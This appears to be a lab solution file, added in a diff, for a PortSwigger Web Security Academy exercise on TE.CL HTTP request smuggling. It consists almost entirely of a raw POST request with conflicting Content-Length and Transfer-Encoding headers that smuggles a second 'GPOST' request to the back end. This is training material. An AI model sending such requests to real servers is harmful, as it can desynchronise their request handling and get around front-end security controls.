@@ -1,0 +1,21 @@
+The request at the end of this file is meant to solve the following lab:
+https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
+
+Front-End Server Gives Precedence To: Transfer Encoding
+Back-End Server Gives Precedence To: Content-Length
+
+POST / HTTP/1.1
+Host: [SUB_DOMAIN].web-security-academy.net
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+65
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 11
+
+hello=world
+0
+
